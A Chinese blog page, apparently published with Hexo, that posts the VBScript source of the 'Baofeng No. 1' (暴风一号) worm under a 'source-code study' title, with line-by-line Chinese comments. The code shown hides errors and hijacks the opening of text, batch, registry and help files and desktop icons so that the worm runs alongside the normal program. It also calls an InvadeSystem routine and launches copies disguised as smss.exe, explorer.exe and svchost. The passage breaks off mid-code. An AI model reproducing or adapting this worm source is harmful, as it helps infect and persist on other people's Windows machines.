@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html>
+<head><link rel=manifest href=/manifest.json><meta name="generator" content="Hexo 3.9.0"><link rel="manifest" href="/manifest.json">
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="dns-prefetch" href="https://gddhy.github.io">
+  <title>暴风一号 病毒 源码学习 | Gddhy&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="暴风一号 病毒 源码学习，vbs源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暴风一号 病毒 源码学习">
+<meta property="og:url" content="https://gddhy.github.io/2024/bao-feng-yi-hao-bing-du-yuan-ma-xue-xi/index.html">
+<meta property="og:site_name" content="Gddhy&#39;s Blog">
+<meta property="og:description" content="暴风一号 病毒 源码学习，vbs源码">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2026-02-19T20:52:36.073Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="暴风一号 病毒 源码学习">
+<meta name="twitter:description" content="暴风一号 病毒 源码学习，vbs源码">
+  
+    <link rel="alternative" href="/atom.xml" title="Gddhy&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" type="text/css" href="/main.0cf68a.css">
+<!--异步加载-->
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.css" media="jscourse" onload="this.media='all'">
+<!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">-->
+  <style type="text/css">
+  
+    #container.show {
+      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
+    }
+  </style>
+  
+
+  
+
+  <link rel="apple-touch-icon" href="/icons/apple-touch-icon.png">
+  <meta name="theme-color" content="#4d4d4d">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+</head>
+</html>
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      
+<div class="overlay" style="background: #4d4d4d"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="/assets/me.jpeg" class="js-avatar">
+		</a>
+		<hgroup>
+		  <h1 class="header-author"><a href="/">gddhy</a></h1>
+		</hgroup>
+		
+		
+		
+		<a id="hitokoto" href="#"  onmouseover="this.style.color='#7fffd4';" onmouseout="this.style.color='aliceblue';">_(:з」∠)_ 加载中...</a>
+		<script src="https://lib.baomitu.com/bluebird/3.7.2/bluebird.min.js"></script>
+		<script src="/js/fetch.min.js"></script>
+		<script src="https://v1.hitokoto.cn/?encode=js&select=%23hitokoto" defer></script>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/archives/index.html">归档</a></li>
+	        
+				<li><a href="/tags/essay">工具</a></li>
+	        
+				<li><a href="/about">关于</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+    		
+    			
+    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+            
+    			
+    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+            
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="qq" target="_blank" href="https://jq.qq.com/?_wv=1027&k=5jUckY8" title="qq"><i class="icon-qq"></i></a>
+		        
+					<a class="coolapk" target="_blank" href="https://www.coolapk.com/u/778415" title="coolapk"><i class="icon-coolapk"></i></a>
+		        
+					<a class="bilibili" target="_blank" href="https://space.bilibili.com/279154676" title="bilibili"><i class="icon-bilibili"></i></a>
+		        
+					<a class="mail" target="_blank" href="mailto:gddhy@foxmail.com" title="mail"><i class="icon-mail"></i></a>
+		        
+					<a class="github" target="_blank" href="https://github.com/gddhy" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      
+<nav id="mobile-nav">
+  	<div class="overlay js-overlay" style="background: #4d4d4d"></div>
+	<div class="btnctn js-mobile-btnctn" id="mobile-menu">
+  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
+	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="/assets/me.jpeg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author js-header-author">gddhy</h1>
+			</hgroup>
+			
+			
+		    <p class="header-subtitle"><i class="icon icon-quo-left"></i><a id="hitokoto2" href="#"  onmouseover="this.style.color='#7fffd4';" onmouseout="this.style.color='aliceblue';" style="color:#696969">_(:з」∠)_ 加载中...</a></i></p>
+	     	<script src="https://lib.baomitu.com/bluebird/3.7.2/bluebird.min.js"></script>
+	    	<script src="/js/fetch.min.js"></script>
+		    <script src="https://v1.hitokoto.cn/?encode=js&select=%23hitokoto2" defer></script>
+	    	
+			
+			
+				
+			
+				
+			
+				
+			
+				
+			
+			
+			
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="qq" target="_blank" href="https://jq.qq.com/?_wv=1027&k=5jUckY8" title="qq"><i class="icon-qq"></i></a>
+			        
+						<a class="coolapk" target="_blank" href="https://www.coolapk.com/u/778415" title="coolapk"><i class="icon-coolapk"></i></a>
+			        
+						<a class="bilibili" target="_blank" href="https://space.bilibili.com/279154676" title="bilibili"><i class="icon-bilibili"></i></a>
+			        
+						<a class="mail" target="_blank" href="mailto:gddhy@foxmail.com" title="mail"><i class="icon-mail"></i></a>
+			        
+						<a class="github" target="_blank" href="https://github.com/gddhy" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss"><i class="icon-rss"></i></a>
+			        
+				</div>
+			</nav>
+
+			<nav class="header-menu js-header-menu">
+				<ul style="width: 70%">
+				
+				
+					<li style="width: 25%"><a href="/">主页</a></li>
+		        
+					<li style="width: 25%"><a href="/archives/index.html">归档</a></li>
+		        
+					<li style="width: 25%"><a href="/tags/essay">工具</a></li>
+		        
+					<li style="width: 25%"><a href="/about">关于</a></li>
+		        
+				</ul>
+			</nav>
+		</header>				
+	</div>
+	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-暴风一号-病毒-源码学习" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      暴风一号 病毒 源码学习
+    </h1>
+  
+
+        
+        
+
+<a href="/2024/bao-feng-yi-hao-bing-du-yuan-ma-xue-xi/" class="archive-article-date">
+  	<time datetime="2024-01-13T14:56:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-13</time>
+</a>
+
+
+<div>
+<span class="archive-article-date">
+  <i class="fa fa-font"aria-hidden="true"></i>字数统计:4k字
+</span>
+<span class="archive-article-date">
+  <i class="fa fa-file-text-o"aria-hidden="true"></i> 阅读时长≈20分
+</span>
+</div>
+
+
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>暴风一号 病毒 源码学习，vbs源码</p>
+<a id="more"></a>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span> <span class="comment">'//屏蔽出错信息，发生错误时继续向下执行</span></span><br><span class="line"><span class="keyword">Dim</span> Fso,WshShell <span class="comment">'//定义了两个变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">'//创建并返回对 Automation 对象的引用。</span></span><br><span class="line"><span class="comment">'//CreateObject(servername.typename [, location])</span></span><br><span class="line"><span class="comment">'//servername 必选项。提供对象的应用程序名称。</span></span><br><span class="line"><span class="comment">'//typename 必选项。要创建的对象类型或类。</span></span><br><span class="line"><span class="comment">'//location 可选项。对象所在的网络服务器将被创建。</span></span><br><span class="line"><span class="comment">'//说明Automation 服务器至少提供一种对象类型。例如，字处理应用程序可以提供应用程序对象、文档对象和工具条对象。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> Fso=<span class="built_in">CreateObject</span>(<span class="string">"scRiPTinG.fiLEsysTeMoBjEcT"</span>) <span class="comment">'//为变量Fso赋值 创建 Scripting.FileSystemObject 对象 提供对计算机文件系统的访问</span></span><br><span class="line"><span class="keyword">Set</span> WshShell=<span class="built_in">CreateObject</span>(<span class="string">"wScRipT.SHelL"</span>) <span class="comment">'//为变量WshShell赋值 创建Wscript.Shell对象 用于获取系统环境变量的访问、创建快捷方式、访问Windows的特殊文件夹，</span></span><br><span class="line">                       <span class="comment">'//以及添加或删除注册表条目。还可以使用Shell对象的功能创建更多的定制对话框以进行用户交互。</span></span><br><span class="line"><span class="keyword">Call</span> Main() <span class="comment">'//call 将控制权传递到sub或function</span></span><br><span class="line"><span class="keyword">Sub</span> Main() <span class="comment">'//sub、function 两种表示方法 sub没有返回值，function有返回值</span></span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">Dim</span> Args, VirusLoad, VirusAss</span><br><span class="line">    <span class="keyword">Set</span> Args=WScript.Arguments <span class="comment">'//返回wsh对象的参数集</span></span><br><span class="line">    VirusLoad=GetMainVirus(<span class="number">1</span>)  <span class="comment">'//获得System文件夹下smss.exe 蠕虫地址</span></span><br><span class="line">    VirusAss=GetMainVirus(<span class="number">0</span>)   <span class="comment">'//获得Windows文件夹下explorer.exe 蠕虫地址</span></span><br><span class="line">    ArgNum=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Do</span> <span class="keyword">While</span> ArgNum &lt; Args.Count</span><br><span class="line">        Param=Param&amp;<span class="string">" "</span>&amp;Args(ArgNum)</span><br><span class="line">        ArgNum=ArgNum + <span class="number">1</span></span><br><span class="line">    <span class="keyword">Loop</span></span><br><span class="line">    SubParam=<span class="built_in">LCase</span>(<span class="built_in">Right</span>(Param, <span class="number">3</span>)) <span class="comment">'//LCase 返回字符串的小写形式 Right 从字符串右边返回指定数目的字符</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Select</span> <span class="keyword">Case</span> SubParam <span class="comment">'//select类似switch</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"run"</span> <span class="comment">'//当运行run时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="built_in">Left</span>(WScript.ScriptFullName, <span class="number">2</span>) <span class="comment">'//ScriptFullName属性返回当前正在运行的脚本的完整路径。该属性返回一个只读的字符串。</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"txt"</span>, <span class="string">"log"</span>,<span class="string">"ini"</span> ,<span class="string">"inf"</span> <span class="comment">'//运行"txt", "log", "ini", "inf"后缀名文件时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"%SystemRoot%/system32/NOTEPAD.EXE "</span>&amp;Param</span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"bat"</span>, <span class="string">"cmd"</span> <span class="comment">'//运行"bat", "cmd"批处理或命令提示符时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"CMD /c echo Hi!I'm here!&amp;pause"</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"reg"</span> <span class="comment">'//运行"reg"注册表导入程序时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"regedit.exe "</span>&amp;<span class="string">""""</span>&amp;<span class="built_in">Trim</span>(Param)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"chm"</span> <span class="comment">'//运行"chm"帮助文件时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"hh.exe "</span>&amp;<span class="string">""""</span>&amp;<span class="built_in">Trim</span>(Param)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"hlp"</span> <span class="comment">'//运行"hlp"帮助文件时，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"winhlp32.exe "</span>&amp;<span class="string">""""</span>&amp;<span class="built_in">Trim</span>(Param)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"dir"</span> <span class="comment">'//运行dir命令，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">""""</span>&amp;<span class="built_in">Left</span>(<span class="built_in">Trim</span>(Param),<span class="built_in">Len</span>(<span class="built_in">Trim</span>(Param))<span class="number">-3</span>)&amp;<span class="string">""""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"oie"</span> <span class="comment">'//打开我IE图标，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"""%ProgramFiles%/Internet Explorer/IEXPLORE.EXE"""</span></span><br><span class="line">        <span class="keyword">Call</span> Run(RunPath)</span><br><span class="line">        <span class="keyword">Call</span> InvadeSystem(VirusLoad,VirusAss)</span><br><span class="line">        <span class="keyword">Call</span> Run(<span class="string">"%SystemRoot%/system/svchost.exe "</span>&amp;VirusLoad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Case</span> <span class="string">"omc"</span> <span class="comment">'//打开我的电脑图标，同时启动病毒文件</span></span><br><span class="line">        RunPath=<span class="string">"explorer.exe /n,::&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;"</span></span><br><span class="line">        <span 